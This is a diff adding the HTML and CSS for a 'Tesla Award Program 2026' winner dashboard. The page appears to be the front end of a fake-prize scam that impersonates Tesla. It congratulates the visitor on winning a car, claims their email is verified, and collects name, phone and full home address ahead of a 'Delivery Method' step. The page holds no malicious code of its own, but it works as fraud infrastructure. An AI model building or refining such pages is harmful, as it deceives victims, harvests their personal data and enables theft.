@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Winner Dashboard | Tesla Award Program 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body{background:var(--light);}
+    .dash-wrap{max-width:1100px;margin:0 auto;padding:88px 24px 64px;}
+
+    /* Step bar */
+    .step-bar{background:white;border-radius:16px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px 32px;margin-bottom:32px;display:flex;align-items:center;gap:0;}
+    @media(max-width:600px){.step-bar{padding:16px 18px;}}
+    .step-col{display:flex;flex-direction:column;align-items:center;flex:1;min-width:0;}
+    .s-circle{width:36px;height:36px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#B0B3B8;background:white;transition:all var(--transition);}
+    .s-circle.active{border-color:var(--red);color:var(--red);box-shadow:0 0 0 4px rgba(227,25,55,.1);}
+    .s-circle.done{border-color:var(--success);background:var(--success);color:white;}
+    .s-label{font-size:11px;font-weight:600;color:#B0B3B8;margin-top:5px;text-align:center;white-space:nowrap;}
+    .s-label.active{color:var(--red);}
+    .s-label.done{color:var(--success);}
+    .s-line{flex:1;height:2px;background:var(--border);margin-top:-20px;transition:background var(--transition);}
+    .s-line.done{background:var(--success);}
+
+    /* Verified banner */
+    .verified-banner{background:linear-gradient(135deg,rgba(0,165,80,.08),rgba(0,165,80,.04));border:1.5px solid rgba(0,165,80,.2);border-radius:14px;padding:18px 24px;display:flex;align-items:center;gap:14px;margin-bottom:28px;}
+    .verified-icon{width:42px;height:42px;background:var(--success);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:20px;flex-shrink:0;}
+    .verified-text strong{font-size:15px;color:var(--dark);}
+    .verified-text p{font-size:13px;color:var(--gray-2);margin-top:2px;}
+
+    /* Section header */
+    .section-hdr{margin-bottom:28px;}
+    .section-hdr h2{font-size:26px;font-weight:800;color:var(--dark);}
+    .section-hdr p{font-size:14px;color:var(--gray-2);margin-top:6px;}
+
+    /* Car grid — Premium Tesla-inspired */
+    .cars-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(310px,100%),1fr));gap:24px;margin-bottom:28px;}
+    @media(max-width:900px){.cars-grid{grid-template-columns:repeat(2,1fr);}}
+    @media(max-width:540px){.cars-grid{grid-template-columns:1fr;}}
+    .dash-car-card{cursor:pointer;background:#fff;border:1px solid rgba(0,0,0,.06);border-radius:18px;overflow:hidden;transition:all .35s cubic-bezier(.4,0,.2,1);box-shadow:0 6px 24px rgba(0,0,0,.04);display:flex;flex-direction:column;height:100%;}
+    .dash-car-card:hover{transform:translateY(-8px);box-shadow:0 20px 40px rgba(0,0,0,.08);border-color:rgba(227,25,55,.3);}
+    .dash-car-card:hover img{transform:scale(1.06) !important;}
+    .dash-specs > div{transition:all .2s}
+    .dash-specs > div:hover{background:rgba(227,25,55,.03) !important;border-color:rgba(227,25,55,.08) !important}
+
+    /* Delivery form */
+    .delivery-wrap{background:white;border-radius:20px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:36px;}
+    @media(max-width:560px){.delivery-wrap{padding:24px 18px;}}
+    .selected-car-banner{background:rgba(227,25,55,.05);border:1px solid rgba(227,25,55,.15);border-radius:12px;padding:14px 18px;display:flex;align-items:center;gap:12px;margin-bottom:28px;}
+    .selected-car-banner strong{font-size:15px;color:var(--dark);}
+    .selected-car-banner span{font-size:13px;color:var(--gray-2);}
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+    @media(max-width:580px){.form-grid{grid-template-columns:1fr;}}
+    .form-full{grid-column:1/-1;}
+
+    /* Welcome popup notification */
+    .welcome-popup{position:fixed;top:24px;left:50%;transform:translateX(-50%);z-index:99999;background:linear-gradient(135deg,var(--dark),#1a0a12);color:#fff;border-radius:16px;padding:20px 32px;display:flex;align-items:center;gap:16px;box-shadow:0 20px 60px rgba(0,0,0,.4),0 0 0 1px rgba(227,25,55,.3);animation:wpopIn .5s cubic-bezier(.16,1,.3,1);max-width:500px;width:calc(100% - 48px)}
+    .welcome-popup.fadeout{animation:wpopOut .45s ease forwards}
+    @keyframes wpopIn{from{opacity:0;transform:translateX(-50%) translateY(-30px) scale(.92)}to{opacity:1;transform:translateX(-50%) translateY(0) scale(1)}}
+    @keyframes wpopOut{from{opacity:1;transform:translateX(-50%) translateY(0) scale(1)}to{opacity:0;transform:translateX(-50%) translateY(-20px) scale(.94)}}
+    .welcome-popup .wp-icon{font-size:36px;flex-shrink:0}
+    .welcome-popup .wp-content{flex:1}
+    .welcome-popup .wp-title{font-size:16px;font-weight:800;letter-spacing:-.3px;margin:0 0 2px}
+    .welcome-popup .wp-sub{font-size:13px;color:rgba(255,255,255,.7);line-height:1.4}
+    .welcome-popup .wp-close{background:rgba(255,255,255,.1);border:none;color:rgba(255,255,255,.6);width:28px;height:28px;border-radius:50%;cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;transition:all .2s;flex-shrink:0}
+    .welcome-popup .wp-close:hover{background:rgba(255,255,255,.2);color:#fff}
+    @media(max-width:480px){.welcome-popup{padding:16px 20px;gap:12px}.welcome-popup .wp-title{font-size:14px}.welcome-popup .wp-sub{font-size:12px}}
+  </style>
+  <link rel="icon" type="image/png" href="assets/tesla-award-logo.png">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <img src="assets/tesla-award-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle">
+      TESLA
+    </a>
+    <button onclick="logout()" class="btn btn-ghost" style="font-size:14px;">Sign Out</button>
+  </div>
+</nav>
+
+<div class="dash-wrap">
+
+  <!-- Step bar -->
+  <div class="step-bar" id="stepBar">
+    <div class="step-col">
+      <div class="s-circle done" id="sc1">✓</div>
+      <div class="s-label done" id="sl1t">Verified</div>
+    </div>
+    <div class="s-line done" id="sl1"></div>
+    <div class="step-col">
+      <div class="s-circle active" id="sc2">2</div>
+      <div class="s-label active" id="sl2t">Select Tesla</div>
+    </div>
+    <div class="s-line" id="sl2"></div>
+    <div class="step-col">
+      <div class="s-circle" id="sc3">3</div>
+      <div class="s-label" id="sl3t">Delivery Details</div>
+    </div>
+    <div class="s-line" id="sl3"></div>
+    <div class="step-col">
+      <div class="s-circle" id="sc4">4</div>
+      <div class="s-label" id="sl4t">Delivery Method</div>
+    </div>
+  </div>
+
+  <!-- Verified banner (shown after email verify) -->
+  <div class="verified-banner anim-fade-up" id="verifiedBanner" style="display:none;">
+    <div class="verified-icon">✓</div>
+    <div class="verified-text">
+      <strong>Email Verified Successfully!</strong>
+      <p>Welcome, <span id="userNameDisplay">winner</span>! Your entry is verified and confirmed. Choose your Tesla below.</p>
+    </div>
+  </div>
+
+  <!-- STEP 2: Car Selection -->
+  <div id="stepSelectCar">
+    <div class="section-hdr">
+      <h2>🏆 Choose Your Tesla</h2>
+      <p>You've won the right to select any Tesla vehicle from our fleet. Click a card to view details, then choose your Tesla on the detail page.</p>
+    </div>
+    <div class="cars-grid" id="carGrid"></div>
+  </div>
+
+  <!-- STEP 3: Delivery Form (hidden initially) -->
+  <div id="stepDelivery" style="display:none;">
+    <div class="section-hdr">
+      <h2>📦 Delivery Information</h2>
+      <p>Please enter the address where you'd like your Tesla delivered. All fields marked * are required.</p>
+    </div>
+    <div class="delivery-wrap">
+      <div class="selected-car-banner">
+        <span style="font-size:28px;" id="selectedCarEmoji">🚗</span>
+        <div>
+          <strong id="selectedCarTitle">Tesla Model 3</strong>
+          <br><span id="selectedCarColor">Pearl White</span>
+        </div>
+        <button onclick="goBackToCars()" class="btn btn-ghost" style="margin-left:auto;font-size:13px;">Change</button>
+      </div>
+      <form id="deliveryForm" novalidate>
+        <div class="form-grid">
+          <div class="form-group">
+            <label class="form-label">Full Name *</label>
+            <input class="form-input" type="text" name="fullName" placeholder="James Anderson" required autocomplete="name">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Phone Number *</label>
+            <input class="form-input" type="tel" name="deliveryPhone" placeholder="+1 (555) 000-0000" required autocomplete="tel">
+          </div>
+          <div class="form-group form-full">
+            <label class="form-label">Street Address *</label>
+            <input class="form-input" type="text" name="address" placeholder="123 Main Street, Apt 4B" required autocomplete="street-address">
+          </div>
+          <div class="form-group">
+            <label class="form-label">City *</label>
+            <input class="form-input" type="text" name="city" placeholder="Los Angeles" required autocomplete="address-level2">
+          </div>
+          <div class="form-group">
+            <label class="form-label">State / Province *</label>
+            <input class="form-input" type="text" name="state" placeholder="California" required autocomplete="address-level1">
+          </div>
+          <div class="form-group">
+            <label class="form-label">ZIP / Postal Code *</label>
+            <input class="form-input" type="text" name="zipCode" placeholder="90001" required autocomplete="postal-code">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Country *</label>
+            <input class="form-input" type="text" name="country" placeholder="United States" required autocomplete="country-name">
+          </div>
+          <div class="form-group form-full">
+            <label class="form-label">Delivery Instructions <span style="color:var(--gray-2);font-weight:400;">(optional)</span></label>
+            <input class="form-input" type="text" name="instructions" placeholder="e.g. Ring doorbell, leave with concierge, gate code #1234">
+          </div>
+        </div>
+        <div style="display:flex;gap:14px;margin-top:8px;flex-wrap:wrap;">
+          <button type="button" class="btn btn-ghost" onclick="goBackToCars()">← Back</button>
+          <button type="submit" class="btn btn-primary btn-lg" style="flex:1;">Continue to Delivery Method →</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script src="js/dashboard.js"></script>
+</body>
+</html>
